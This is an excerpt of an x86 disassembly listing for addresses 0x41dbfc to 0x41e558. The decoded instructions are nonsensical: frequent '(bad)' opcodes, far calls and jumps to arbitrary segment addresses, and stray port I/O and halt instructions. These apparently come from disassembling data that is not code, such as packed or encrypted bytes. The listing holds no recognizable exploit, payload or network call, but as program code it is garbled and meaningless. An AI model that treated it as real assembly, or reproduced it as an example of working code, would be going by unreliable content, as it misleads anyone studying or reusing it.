  41dbfc:	xchg   DWORD PTR [ecx+0x29],eax
  41dbff:	inc    ebx
  41dc00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc01:	push   ss
  41dc02:	pop    edi
  41dc03:	(bad)  
  41dc04:	xchg   esi,eax
  41dc05:	and    al,0x53
  41dc07:	out    0x89,al
  41dc09:	push   ecx
  41dc0a:	scas   eax,DWORD PTR es:[edi]
  41dc0b:	fisub  WORD PTR [esi]
  41dc0d:	ret    0x1eac
  41dc10:	call   0xe60a:0xff6033d2
  41dc17:	pop    ebx
  41dc18:	aas    
  41dc19:	and    ebx,esp
  41dc1b:	aaa    
  41dc1c:	ins    BYTE PTR es:[edi],dx
  41dc1d:	cmp    al,0x99
  41dc1f:	and    eax,0x629e3741
  41dc24:	sbb    al,0xff
  41dc26:	jg     0x41dbdf
  41dc28:	mov    fs,ebp
  41dc2a:	adc    ebx,DWORD PTR [ecx-0x1d6f7cda]
  41dc30:	xchg   BYTE PTR [ebx-0x1f0f4062],ah
  41dc36:	outs   dx,BYTE PTR ds:[esi]
  41dc37:	mov    bl,0x23
  41dc39:	(bad)  
  41dc3a:	adc    al,0x95
  41dc3c:	cmp    al,0x92
  41dc3e:	out    0x0,al
  41dc40:	lock lods eax,DWORD PTR ds:[esi]
  41dc42:	cmp    dh,BYTE PTR [ecx+0x45]
  41dc45:	jl     0x41dc12
  41dc47:	mov    eax,ds:0x14f32b9e
  41dc4c:	loope  0x41dcb2
  41dc4e:	add    DWORD PTR [eax-0x38],ebx
  41dc51:	or     BYTE PTR [edx-0x61],dh
  41dc54:	enter  0x9b67,0xfd
  41dc58:	fild   QWORD PTR [eax+esi*2]
  41dc5b:	das    
  41dc5c:	jnp    0x41dc8b
  41dc5e:	jno    0x41dc0d
  41dc60:	(bad)  
  41dc61:	fbstp  TBYTE PTR [esi-0x32]
  41dc64:	and    eax,0x2862f9c7
  41dc69:	retf   
  41dc6a:	neg    BYTE PTR [esi+0xc55]
	...
  41dcd4:	add    BYTE PTR [eax],al
  41dcd6:	outs   dx,DWORD PTR ds:[esi]
  41dcd7:	retf   0x9815
  41dcda:	mov    ch,0xdf
  41dcdc:	out    dx,eax
  41dcdd:	jmp    DWORD PTR [edi+0x7cb0d050]
  41dce3:	stc    
  41dce4:	clc    
  41dce5:	ins    DWORD PTR es:[edi],dx
  41dce6:	addr16 inc eax
  41dce8:	add    DWORD PTR [eax],eax
  41dcea:	add    BYTE PTR [ecx],al
  41dcec:	add    BYTE PTR [eax],al
  41dcee:	in     al,dx
  41dcef:	sbb    eax,0x46c281c9
  41dcf4:	daa    
  41dcf5:	shr    BYTE PTR [ecx],0x49
  41dcf8:	xchg   ecx,eax
  41dcf9:	mov    esi,0xb2907b87
  41dcfe:	cwde   
  41dcff:	push   cs
  41dd00:	mov    ds:0xbf02aef,al
  41dd05:	add    al,0x1c
  41dd07:	in     eax,dx
  41dd08:	add    BYTE PTR [ebx+0x1],ch
  41dd0b:	in     al,0x27
  41dd0d:	hlt    
  41dd0e:	out    dx,al
  41dd0f:	int3   
  41dd10:	test   al,0x21
  41dd12:	jge    0x41dd75
  41dd14:	scas   eax,DWORD PTR es:[edi]
  41dd15:	pop    edi
  41dd16:	push   ss
  41dd17:	sbb    cl,BYTE PTR [ecx+esi*2-0x50]
  41dd1b:	addr16 push cs
  41dd1d:	mov    bl,0x21
  41dd1f:	push   0x41
  41dd21:	mov    BYTE PTR [eax-0x25],dl
  41dd24:	mov    ds:0x14a73d81,al
  41dd29:	or     eax,esi
  41dd2b:	popw   es
  41dd2d:	shr    DWORD PTR [esi-0x2420797],0x7f
  41dd34:	outs   dx,BYTE PTR ds:[esi]
  41dd35:	xchg   edx,eax
  41dd36:	adc    ch,al
  41dd38:	dec    esp
  41dd39:	aas    
  41dd3a:	repnz sbb esi,ebp
  41dd3d:	shl    DWORD PTR [ecx],cl
  41dd3f:	iret   
  41dd40:	icebp  
  41dd41:	loop   0x41ddbd
  41dd43:	push   0x15d0d76b
  41dd48:	jb     0x41dd1e
  41dd4a:	cli    
  41dd4b:	mov    al,0xaf
  41dd4d:	loope  0x41dd36
  41dd4f:	out    dx,eax
  41dd50:	(bad)  
  41dd51:	mov    WORD PTR [ecx-0x22],?
  41dd54:	and    BYTE PTR [esp+edi*2],bh
  41dd57:	push   0x5e2525e5
  41dd5c:	in     al,0x9f
  41dd5e:	test   DWORD PTR [edx+ebp*2],ebx
  41dd61:	in     al,0xf1
  41dd63:	std    
  41dd64:	rcl    BYTE PTR ds:0xf0e8f7c,cl
  41dd6a:	xchg   ecx,eax
  41dd6b:	popa   
  41dd6c:	adc    al,0x46
  41dd6e:	pop    esp
  41dd6f:	jmp    0x28017a6c
  41dd74:	aam    0x5a
  41dd76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd77:	test   DWORD PTR [esi+0x1a76e1df],ebx
  41dd7d:	shl    DWORD PTR ds:0xa473cdd4,cl
  41dd83:	ja     0x41dd46
  41dd85:	sahf   
  41dd86:	lahf   
  41dd87:	imul   ebx,DWORD PTR [ebp+0x796f08f0],0x67bc5ea2
  41dd91:	mov    eax,0x9cc6d0b2
  41dd96:	in     eax,0x2
  41dd98:	jo     0x41dd65
  41dd9a:	into   
  41dd9b:	es push esi
  41dd9d:	js     0x41dde3
  41dd9f:	lock adc al,0xeb
  41dda2:	xchg   edi,eax
  41dda3:	jbe    0x41ddcf
  41dda5:	jno    0x41ddcf
  41dda7:	clc    
  41dda8:	jmp    0xc38c:0xf26e7c42
  41ddaf:	add    eax,0x3350006a
  41ddb4:	xchg   edx,eax
  41ddb5:	ds xchg edi,eax
  41ddb7:	push   esp
  41ddb8:	push   ebx
  41ddb9:	dec    eax
  41ddba:	cmp    al,0x4c
  41ddbc:	add    al,0xc7
  41ddbe:	sbb    eax,DWORD PTR [ecx+edi*1]
  41ddc1:	test   al,0x25
  41ddc3:	out    dx,al
  41ddc4:	stos   BYTE PTR es:[edi],al
  41ddc5:	arpl   WORD PTR [edx+ebx*2],sp
  41ddc8:	jge    0x41dd7b
  41ddca:	(bad)  
  41ddcb:	or     eax,0xce87d3fd
  41ddd0:	fwait
  41ddd1:	or     al,0xf2
  41ddd3:	adc    BYTE PTR [ebx-0x4a],0xc0
  41ddd7:	or     al,0x64
  41ddd9:	mov    dh,0xbd
  41dddb:	xor    BYTE PTR [eax],al
  41dddd:	int    0xe0
  41dddf:	pusha  
  41dde0:	inc    ecx
  41dde1:	cmp    DWORD PTR [ebx+0x53],0x5b
  41dde5:	aam    0xf8
  41dde7:	fst    QWORD PTR [eax+ebp*4]
  41ddea:	lahf   
  41ddeb:	mov    edi,0x8e62
	...
  41de54:	add    BYTE PTR [eax],al
  41de56:	and    bl,dh
  41de58:	das    
  41de59:	cmp    bh,0xde
  41de5c:	lods   eax,DWORD PTR ds:[esi]
  41de5d:	repz pop ds
  41de5f:	mov    bl,BYTE PTR [esi-0x41]
  41de62:	call   0x68185506
  41de67:	inc    ecx
  41de68:	add    DWORD PTR [eax],eax
  41de6a:	add    BYTE PTR [ecx],al
  41de6c:	add    BYTE PTR [eax],al
  41de6e:	pop    ebx
  41de6f:	push   ds
  41de70:	mov    ds:0xa3e41c72,al
  41de75:	fld    QWORD PTR [esi]
  41de77:	call   0x8ed0b6af
  41de7c:	pop    ds
  41de7d:	dec    edi
  41de7e:	icebp  
  41de7f:	jae    0x41de39
  41de81:	mov    ebx,0x1672e00a
  41de86:	jmp    0x41de8e
  41de88:	out    dx,eax
  41de89:	adc    eax,0x703db055
  41de8e:	dec    esi
  41de8f:	sub    al,0xc
  41de91:	scas   al,BYTE PTR es:[edi]
  41de92:	in     al,dx
  41de93:	add    eax,0x7cfd8dc5
  41de98:	push   ebx
  41de99:	test   al,0x15
  41de9b:	pop    ecx
  41de9c:	or     al,0xc8
  41de9e:	stos   BYTE PTR es:[edi],al
  41de9f:	jmp    0xb7c9:0xfa9742af
  41dea6:	iret   
  41dea7:	jbe    0x41de7f
  41dea9:	out    dx,eax
  41deaa:	sti    
  41deab:	jp     0x41de93
  41dead:	loop   0x41dee9
  41deaf:	(bad)  
  41deb0:	jae    0x41df0c
  41deb2:	pop    ecx
  41deb3:	xchg   esi,eax
  41deb4:	ret    
  41deb5:	xchg   BYTE PTR [eax],bh
  41deb7:	stc    
  41deb8:	test   BYTE PTR [edx],0x7c
  41debb:	(bad)  
  41debc:	je     0x41def8
  41debe:	call   0x5977:0xe8e42c2d
  41dec5:	fwait
  41dec6:	sbb    BYTE PTR [ebx+0x20],dl
  41dec9:	clc    
  41deca:	mov    edx,0xe3dcc756
  41decf:	daa    
  41ded0:	fiadd  DWORD PTR [eax]
  41ded2:	jl     0x41dea3
  41ded4:	dec    esp
  41ded5:	cmp    esp,DWORD PTR [ebx-0x58]
  41ded8:	mov    bh,0xcc
  41deda:	sub    ebx,DWORD PTR [ecx+ebx*2]
  41dedd:	jge    0x41df43
  41dedf:	je     0x41dea7
  41dee1:	in     al,0x33
  41dee3:	pop    esi
  41dee4:	fist   DWORD PTR [ebp-0x7470d6fc]
  41deea:	xor    al,0xf2
  41deec:	sub    eax,0xf01d1ca2
  41def1:	sub    DWORD PTR es:[esp+esi*4],0x8f94d5fe
  41def9:	repnz cmp al,0xf1
  41defc:	cmp    esi,DWORD PTR [ebp+0x32223893]
  41df02:	add    al,0x32
  41df04:	in     al,dx
  41df05:	mov    al,ds:0x127c24d0
  41df0a:	sbb    BYTE PTR [ebx+0x10ac3a65],dh
  41df10:	xchg   esp,eax
  41df11:	fst    QWORD PTR [edi+0x69]
  41df14:	popf   
  41df15:	outs   dx,DWORD PTR ds:[esi]
  41df16:	push   ss
  41df17:	aad    0x71
  41df19:	sbb    DWORD PTR [esi-0xa],esi
  41df1c:	out    0xfc,al
  41df1e:	xchg   edi,eax
  41df1f:	adc    bl,ch
  41df21:	jb     0x41df26
  41df23:	dec    esp
  41df24:	js     0x41df76
  41df26:	(bad)
  41df29:	xchg   ebp,eax
  41df2a:	mov    esp,DWORD PTR [eax-0x73]
  41df2d:	jmp    0x1ba03c94
  41df32:	mov    bh,0x63
  41df34:	fcom   DWORD PTR [edx-0x39]
  41df37:	push   cs
  41df38:	sub    edx,eax
  41df3a:	ret    
  41df3b:	outs   dx,BYTE PTR ds:[esi]
  41df3c:	repnz push ds
  41df3e:	sub    BYTE PTR [ecx-0x20],dl
  41df41:	xor    bl,al
  41df43:	sub    BYTE PTR [ebp-0x6f],cl
  41df46:	arpl   WORD PTR [edi-0x4],bp
  41df49:	xlat   BYTE PTR ds:[ebx]
  41df4a:	adc    BYTE PTR [esi],0x46
  41df4d:	mov    ds:0xc0cc2bda,eax
  41df52:	lods   al,BYTE PTR ds:[esi]
  41df53:	mov    edi,0x131e2ae4
  41df58:	rcr    BYTE PTR [ecx-0x59],cl
  41df5b:	pop    edx
  41df5c:	dec    ebp
  41df5d:	push   cs
  41df5e:	nop
  41df5f:	xchg   edi,eax
  41df60:	fwait
  41df61:	and    DWORD PTR [ebx+0x24495e36],0xffffffa2
  41df68:	in     al,0x64
  41df6a:	dec    ebx
  41df6b:	push   0x3cd7
	...
  41dfd4:	add    BYTE PTR [eax],al
  41dfd6:	aas    
  41dfd7:	daa    
  41dfd8:	push   ss
  41dfd9:	cld    
  41dfda:	push   ds
  41dfdb:	std    
  41dfdc:	jmp    edi
  41dfde:	dec    edi
  41dfdf:	push   0x7ca9ce9
  41dfe4:	fadd   QWORD PTR [ebx]
  41dfe6:	addr16 inc edx
  41dfe8:	add    DWORD PTR [eax],eax
  41dfea:	add    BYTE PTR [ecx],al
  41dfec:	add    BYTE PTR [eax],al
  41dfee:	bound  esp,QWORD PTR [eax]
  41dff0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dff1:	adc    BYTE PTR [bp+0x42],0x21
  41dff6:	mov    ecx,eax
  41dff8:	cmc    
  41dff9:	jns    0x41dfe0
  41dffb:	mov    edi,0x204d7438
  41e000:	and    ecx,ecx
  41e002:	and    al,0x94
  41e004:	pop    eax
  41e005:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e006:	jp     0x41e03a
  41e008:	gs inc esp
  41e00a:	fcom   DWORD PTR [esi*8+0x18d73742]
  41e011:	dec    edx
  41e012:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e013:	dec    ecx
  41e014:	xchg   ecx,eax
  41e015:	mov    ah,0x7a
  41e017:	(bad)  
  41e018:	sbb    eax,0xd653f8d2
  41e01d:	lods   al,BYTE PTR ds:[esi]
  41e01e:	cmp    ax,0x7d5d
  41e022:	inc    ebp
  41e023:	jp     0x41e04e
  41e025:	xor    bl,bl
  41e027:	lock (bad) 
  41e029:	out    dx,eax
  41e02a:	mov    DWORD PTR [ecx-0x5a90681d],esp
  41e030:	test   al,0xc0
  41e032:	adc    DWORD PTR ds:0x5b7fce80,eax
  41e038:	(bad)  
  41e039:	idiv   DWORD PTR [edi+0x36]
  41e03c:	mov    WORD PTR [ebp+0x258a5946],gs
  41e042:	outs   dx,DWORD PTR ds:[esi]
  41e043:	dec    DWORD PTR [edi+0x7e]
  41e046:	and    eax,eax
  41e048:	or     edx,eax
  41e04a:	and    al,0x9a
  41e04c:	xor    al,0x3
  41e04e:	stos   BYTE PTR es:[edi],al
  41e04f:	or     al,0x29
  41e051:	aad    0xfd
  41e053:	iret   
  41e054:	sbb    BYTE PTR [esi+0x4e],ah
  41e057:	js     0x41e0cf
  41e059:	nop
  41e05a:	lds    esi,FWORD PTR [edx-0x6b]
  41e05d:	mov    dl,0xbe
  41e05f:	pop    edx
  41e060:	add    DWORD PTR [edx+0x51],edi
  41e063:	mov    bl,0xda
  41e065:	icebp  
  41e066:	inc    eax
  41e067:	xchg   edi,eax
  41e068:	cmc    
  41e069:	mov    DWORD PTR [ebx+0x16],eax
  41e06c:	add    DWORD PTR [ecx-0x61c4d404],esp
  41e072:	sub    eax,0x2233c13e
  41e077:	fistp  QWORD PTR [ebx]
  41e079:	in     eax,dx
  41e07a:	leave  
  41e07b:	ins    DWORD PTR es:[edi],dx
  41e07c:	mov    edx,0x68260d25
  41e081:	xchg   ecx,eax
  41e082:	into   
  41e083:	cmp    eax,DWORD PTR [ecx+0x2b]
  41e086:	pop    ecx
  41e087:	mov    esp,0xca69c0dc
  41e08c:	push   ss
  41e08d:	pop    ss
  41e08e:	sar    BYTE PTR [eax],1
  41e090:	mov    ebx,0x2d4648da
  41e095:	or     DWORD PTR [esi+0x79],esp
  41e098:	mov    al,ds:0x38ef0201
  41e09d:	ud0    esi,DWORD PTR ds:0x50a81f2b
  41e0a4:	mov    ecx,0x1af40975
  41e0a9:	mov    bl,0x57
  41e0ab:	pop    ecx
  41e0ac:	add    DWORD PTR [esi+0x4e],ebx
  41e0af:	pop    es
  41e0b0:	cwde   
  41e0b1:	jns    0x41e0f3
  41e0b3:	cmc    
  41e0b4:	ror    DWORD PTR [esi],cl
  41e0b6:	inc    ebp
  41e0b7:	pop    ecx
  41e0b8:	or     bh,BYTE PTR [edi+0x21]
  41e0bb:	call   0xfb91:0x21223bd7
  41e0c2:	enter  0x5116,0x27
  41e0c6:	sahf   
  41e0c7:	push   0x5c
  41e0c9:	jns    0x41e0d6
  41e0cb:	icebp  
  41e0cc:	lock and eax,0x777ae826
  41e0d2:	pop    edi
  41e0d3:	inc    edx
  41e0d4:	addr16 test al,0x19
  41e0d7:	aam    0xe7
  41e0d9:	lds    edx,FWORD PTR [ebx-0x75e70635]
  41e0df:	mov    dh,0xf0
  41e0e1:	adc    al,0x50
  41e0e3:	cs mov edx,0x8eb73273
  41e0e9:	fisttp DWORD PTR [eax]
  41e0eb:	clc    
  41e0ec:	test   eax,0x25
	...
  41e155:	add    BYTE PTR [edi+0x53],cl
  41e158:	add    al,0xc
  41e15a:	sbb    al,0x5f
  41e15c:	dec    edi
  41e15d:	push   ebx
  41e15e:	out    0x6d,eax
  41e160:	aad    0x48
  41e162:	daa    
  41e163:	sbb    eax,0x436762a3
  41e168:	add    DWORD PTR [eax],eax
  41e16a:	add    BYTE PTR [ecx],al
  41e16c:	add    BYTE PTR [eax],al
  41e16e:	loop   0x41e134
  41e170:	sub    edx,DWORD PTR [ebx]
  41e172:	adc    al,cl
  41e174:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e175:	inc    ebx
  41e176:	popf   
  41e177:	pop    ss
  41e178:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e179:	and    eax,0x7f1bd9f
  41e17e:	dec    ecx
  41e17f:	enter  0x5b70,0xb9
  41e183:	add    ah,BYTE PTR [eax-0x1d7347e]
  41e189:	popf   
  41e18a:	or     al,0x5
  41e18c:	fwait
  41e18d:	hlt    
  41e18e:	xchg   edi,eax
  41e18f:	lods   al,BYTE PTR ds:[esi]
  41e190:	mov    ebx,0x5247b83f
  41e195:	das    
  41e196:	dec    BYTE PTR [edx]
  41e198:	fistp  DWORD PTR [ebp-0x46]
  41e19b:	adc    eax,DWORD PTR [edx]
  41e19d:	repz retf 0x637d
  41e1a1:	je     0x41e168
  41e1a3:	pop    es
  41e1a4:	sahf   
  41e1a5:	cld    
  41e1a6:	das    
  41e1a7:	das    
  41e1a8:	push   0xffffff90
  41e1aa:	stc    
  41e1ab:	inc    esi
  41e1ac:	or     DWORD PTR [bp-0xc4e],ebp
  41e1b1:	xchg   BYTE PTR [ebp-0xeb6d6fe],bl
  41e1b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e1b8:	add    edx,DWORD PTR [ebp-0x5cc21ea6]
  41e1be:	inc    esp
  41e1bf:	(bad)  
  41e1c0:	addr16 loope 0x41e1ea
  41e1c3:	imul   eax,DWORD PTR [esi-0x171f2775],0x4eb74649
  41e1cd:	popf   
  41e1ce:	daa    
  41e1cf:	int    0x5
  41e1d1:	test   DWORD PTR [esi+0x44cd2a8c],eax
  41e1d7:	sbb    al,0x8a
  41e1d9:	or     eax,0x7c96b693
  41e1de:	add    eax,0xcc1b0497
  41e1e3:	add    BYTE PTR [edi-0x66],0x44
  41e1e7:	into   
  41e1e8:	pop    edx
  41e1e9:	ds enter 0x8125,0xdb
  41e1ee:	fadd   st(5),st
  41e1f0:	mov    WORD PTR [esi-0x13],cs
  41e1f3:	push   ss
  41e1f4:	sar    BYTE PTR [ebp+0x5ab65730],0x90
  41e1fb:	mov    esp,0xff085403
  41e200:	rcr    ah,0xd8
  41e203:	inc    edx
  41e204:	int    0x85
  41e206:	std    
  41e207:	popf   
  41e208:	push   0xffffffab
  41e20a:	fsubr  QWORD PTR [eax]
  41e20c:	or     esp,ebp
  41e20e:	outs   dx,BYTE PTR ds:[esi]
  41e20f:	fwait
  41e210:	sti    
  41e211:	enter  0x85ac,0x62
  41e215:	sahf   
  41e216:	outs   dx,DWORD PTR ds:[esi]
  41e217:	fild   WORD PTR [edi]
  41e219:	ds xchg ecx,eax
  41e21b:	xor    DWORD PTR [eax+0x32e8a48d],ecx
  41e221:	scas   al,BYTE PTR es:[edi]
  41e222:	adc    cl,bh
  41e224:	xor    edx,DWORD PTR [eax-0x4c]
  41e227:	pop    esp
  41e228:	xor    al,BYTE PTR [eax]
  41e22a:	in     eax,0xa2
  41e22c:	add    DWORD PTR ds:0xb0bb7048,eax
  41e232:	fsubrp st(1),st
  41e234:	out    0x6d,eax
  41e236:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e237:	mov    ch,0x5
  41e239:	imul   eax,DWORD PTR [edi],0x41
  41e23c:	push   es
  41e23d:	clc    
  41e23e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e23f:	fsubp  st(2),st
  41e241:	adc    edi,ecx
  41e243:	sub    DWORD PTR [ecx+0x37b044d6],esp
  41e249:	cmp    eax,0x8a1fcb6d
  41e24e:	rol    DWORD PTR [edx],1
  41e250:	shr    DWORD PTR [ebp-0x64],0x7b
  41e254:	std    
  41e255:	outs   dx,DWORD PTR ds:[esi]
  41e256:	mov    bh,0x21
  41e258:	jo     0x41e27c
  41e25a:	inc    eax
  41e25b:	out    dx,eax
  41e25c:	adc    ecx,DWORD PTR [esi-0x37]
  41e25f:	fstp   QWORD PTR [ebp-0x6c]
  41e262:	or     al,0x9e
  41e264:	dec    esi
  41e265:	jnp    0x41e26e
  41e267:	lahf   
  41e268:	ret    0xa191
  41e26b:	mov    edi,0x8517
	...
  41e2d4:	add    BYTE PTR [eax],al
  41e2d6:	stos   DWORD PTR es:[edi],eax
  41e2d7:	add    dh,BYTE PTR [edi-0x1a]
  41e2da:	push   edi
  41e2dc:	mov    ebx,0x6f64c34f
  41e2e1:	or     al,0x7e
  41e2e3:	add    DWORD PTR [ebx-0x57],esp
  41e2e6:	addr16 inc esp
  41e2e8:	add    DWORD PTR [eax],eax
  41e2ea:	add    BYTE PTR [ecx],al
  41e2ec:	add    BYTE PTR [eax],al
  41e2ee:	fadd   DWORD PTR [ebx-0x459e981e]
  41e2f4:	mov    al,0x5
  41e2f6:	mov    DWORD PTR [ebx-0x5b],esi
  41e2f9:	dec    ecx
  41e2fa:	retf   0x2c12
  41e2fd:	imul   edx,DWORD PTR [edx-0x1],0xffffffa5
  41e301:	into   
  41e302:	jmp    0x41e2ac
  41e304:	jl     0x41e2bc
  41e306:	lea    ebx,[esi-0x43]
  41e309:	and    esi,DWORD PTR [edi-0x40]
  41e30c:	push   0x6
  41e30e:	scas   al,BYTE PTR es:[edi]
  41e30f:	gs ja  0x41e2f5
  41e312:	(bad)  
  41e313:	int    0xe8
  41e315:	push   ecx
  41e316:	bound  ebx,QWORD PTR [esi]
  41e318:	mov    ds:0xad4d237,eax
  41e31d:	xchg   esp,eax
  41e31e:	xchg   edi,eax
  41e31f:	(bad)
  41e322:	dec    ebx
  41e323:	in     eax,0xf0
  41e325:	mov    ds:0x2fc9c9ac,eax
  41e32a:	rcl    DWORD PTR [edx-0x3e1d35af],1
  41e330:	ja     0x41e2f0
  41e332:	push   esp
  41e333:	push   ds
  41e334:	mov    esi,0x349fcf9b
  41e339:	ret    0x5fa5
  41e33c:	jb     0x41e2ea
  41e33e:	stos   BYTE PTR es:[edi],al
  41e33f:	addr16 mov ecx,0xa86e7ecb
  41e345:	xor    ch,BYTE PTR [ebp+0x1523728e]
  41e34b:	out    dx,eax
  41e34c:	or     BYTE PTR [edi],0x8c
  41e34f:	imul   ebp,DWORD PTR [ebx+0x5e],0x2ed1c674
  41e356:	ins    DWORD PTR es:[edi],dx
  41e357:	out    0x18,al
  41e359:	xchg   esp,eax
  41e35a:	dec    eax
  41e35b:	adc    BYTE PTR [eax-0x5f],ch
  41e35e:	or     DWORD PTR [eax+eax*8-0x2ec85839],edx
  41e365:	pop    ss
  41e366:	es or  al,0x1d
  41e369:	adc    esp,esp
  41e36b:	dec    ebx
  41e36c:	mov    dh,0x4
  41e36e:	mov    ds:0x66f7665e,al
  41e373:	gs das 
  41e375:	mov    ecx,0x66bfc354
  41e37a:	xchg   ebp,eax
  41e37b:	pusha  
  41e37c:	icebp  
  41e37d:	cld    
  41e37e:	scas   eax,DWORD PTR es:[edi]
  41e37f:	cld    
  41e380:	or     al,0x38
  41e382:	(bad)  [esi]
  41e384:	jecxz  0x41e396
  41e386:	test   eax,0xcc8c1523
  41e38b:	mov    edi,0x95769535
  41e390:	and    esi,esp
  41e392:	fiadd  DWORD PTR [edx]
  41e394:	pusha  
  41e395:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e396:	ins    DWORD PTR es:[edi],dx
  41e397:	add    edx,DWORD PTR [ecx+0x6b]
  41e39a:	push   ds
  41e39b:	jmp    0x41e33d
  41e39d:	fmul   QWORD PTR [ebx+0x77]
  41e3a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e3a1:	repz aas 
  41e3a3:	int3   
  41e3a4:	pop    es
  41e3a5:	xchg   al,ch
  41e3a7:	sub    ebp,0xd0719ed5
  41e3ad:	lea    ebp,[edx]
  41e3af:	push   ss
  41e3b0:	jmp    0x41e35e
  41e3b2:	ins    DWORD PTR es:[edi],dx
  41e3b3:	xchg   edx,eax
  41e3b4:	loope  0x41e39d
  41e3b6:	adc    al,0x8b
  41e3b8:	aad    0x9d
  41e3ba:	sahf   
  41e3bb:	adc    BYTE PTR [esi+ebx*4],dl
  41e3be:	fadd   DWORD PTR [edi]
  41e3c0:	xchg   edi,eax
  41e3c1:	outs   dx,BYTE PTR ds:[esi]
  41e3c2:	sbb    ecx,DWORD PTR gs:[bx+di-0x3677]
  41e3c8:	lahf   
  41e3c9:	in     al,0xf6
  41e3cb:	pop    esi
  41e3cc:	mov    ebx,0xe4b8c6c3
  41e3d1:	or     eax,0x2779ef5a
  41e3d6:	imul   esi,DWORD PTR [edi],0x43
  41e3d9:	inc    ebx
  41e3db:	add    eax,0x449d6e02
  41e3e0:	xchg   esi,eax
  41e3e1:	aam    0x5a
  41e3e3:	pop    cx
  41e3e5:	inc    ebp
  41e3e6:	and    BYTE PTR [ebx],bh
  41e3e8:	jbe    0x41e439
  41e3ea:	test   DWORD PTR [edi],esi
  41e3ec:	ins    DWORD PTR es:[edi],dx
  41e3ed:	ret    0x0
	...
  41e454:	add    BYTE PTR [eax],al
  41e456:	mov    DWORD PTR [edx],edx
  41e458:	ja     0x41e479
  41e45a:	(bad)  
  41e45b:	jg     0x41e446
  41e45d:	xchg   esi,eax
  41e45e:	or     DWORD PTR [edx+0x18],0x8e60109
  41e465:	sub    eax,0x14567
  41e46a:	add    BYTE PTR [ecx],al
  41e46c:	add    BYTE PTR [eax],al
  41e46e:	or     DWORD PTR [edi-0x4dab48a2],edi
  41e474:	pop    es
  41e475:	jecxz  0x41e481
  41e477:	pop    edx
  41e478:	out    0x89,eax
  41e47a:	test   BYTE PTR [ecx],ah
  41e47c:	push   es
  41e47d:	stos   DWORD PTR es:[edi],eax
  41e47e:	int3   
  41e47f:	std    
  41e480:	jns    0x41e4ca
  41e482:	inc    eax
  41e483:	sub    BYTE PTR [ebx+0x15],ah
  41e486:	test   bh,al
  41e488:	retf   
  41e489:	std    
  41e48a:	push   0x6a
  41e48c:	sub    edx,edi
  41e48e:	xor    bh,BYTE PTR [eax]
  41e490:	or     al,0x8f
  41e492:	push   ds
  41e493:	cmp    DWORD PTR [ebx],ecx
  41e495:	fild   WORD PTR [ecx+eiz*4]
  41e498:	out    dx,al
  41e499:	pop    edx
  41e49a:	xor    cl,BYTE PTR [ebx]
  41e49c:	mov    bh,0x5f
  41e49e:	(bad)  [eax]
  41e4a0:	sub    ebx,esi
  41e4a2:	mov    al,ds:0x88433554
  41e4a7:	adc    ebx,ecx
  41e4a9:	cvtps2pi mm3,QWORD PTR [edx]
  41e4ac:	lods   al,BYTE PTR ds:[esi]
  41e4ad:	mov    dh,0xf2
  41e4af:	shr    BYTE PTR [edi-0x52],cl
  41e4b2:	dec    esp
  41e4b3:	loop   0x41e52a
  41e4b5:	jns    0x41e469
  41e4b7:	loope  0x41e4aa
  41e4b9:	imul   ch
  41e4bb:	mov    ecx,0xfc0678eb
  41e4c0:	stos   BYTE PTR es:[edi],al
  41e4c1:	sub    dl,0x47
  41e4c4:	or     DWORD PTR [edx],esi
  41e4c6:	sub    DWORD PTR [esi-0x7bf50612],ebp
  41e4cc:	push   ss
  41e4cd:	les    edi,FWORD PTR [edx-0x80]
  41e4d0:	arpl   ax,ax
  41e4d2:	xor    edx,DWORD PTR [edi+0x54]
  41e4d5:	push   ebp
  41e4d6:	jle    0x41e474
  41e4d8:	aas    
  41e4d9:	std    
  41e4da:	sub    ebx,DWORD PTR [ebx]
  41e4dc:	jae    0x41e49d
  41e4de:	outs   dx,BYTE PTR ds:[esi]
  41e4df:	jo     0x41e4d4
  41e4e1:	cmp    al,0xa3
  41e4e3:	icebp  
  41e4e4:	imul   edx,DWORD PTR [edx+0x37a2d460],0x2c384b2a
  41e4ee:	jae    0x41e500
  41e4f0:	sub    bh,BYTE PTR [esp+esi*2]
  41e4f3:	inc    esi
  41e4f4:	xchg   ebp,eax
  41e4f5:	jle    0x41e4e7
  41e4f7:	lea    ebx,[edi+0x1b97bdfb]
  41e4fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e4fe:	jb     0x41e4bf
  41e500:	pop    eax
  41e501:	dec    edx
  41e502:	mov    ah,0x7f
  41e504:	and    eax,0x33d8aaf6
  41e509:	xchg   esp,eax
  41e50a:	add    dl,bl
  41e50c:	nop
  41e50d:	sub    eax,DWORD PTR [edi+0x34]
  41e510:	and    ah,BYTE PTR [edi+0x4a]
  41e513:	stos   BYTE PTR es:[edi],al
  41e514:	add    bl,BYTE PTR [ecx]
  41e516:	(bad)  
  41e517:	daa    
  41e518:	icebp  
  41e519:	shr    BYTE PTR [ecx+0x75e45600],cl
  41e51f:	add    BYTE PTR [ebp-0x1c36713],bh
  41e525:	icebp  
  41e526:	pop    ds
  41e527:	inc    eax
  41e528:	add    eax,0xd2d4abc0
  41e52d:	mov    ah,0xb9
  41e52f:	inc    esp
  41e530:	jg     0x41e4d6
  41e532:	(bad)  
  41e533:	xor    al,0x1a
  41e535:	inc    ebx
  41e536:	pusha  
  41e537:	sti    
  41e538:	popa   
  41e539:	arpl   WORD PTR [esp+esi*4-0x5e996ed3],si
  41e540:	(bad)
  41e543:	fmul   DWORD PTR [ebp+0x6e]
  41e546:	pusha  
  41e547:	stos   BYTE PTR es:[edi],al
  41e548:	jnp    0x41e5c1
  41e54a:	cmc    
  41e54b:	adc    eax,0x1a445df2
  41e550:	test   bh,0xa1
  41e553:	and    DWORD PTR [esi],0x7f
  41e556:	jp     0x41e57a
  41e558:	mov    WORD PTR [ebp-0x6c],gs
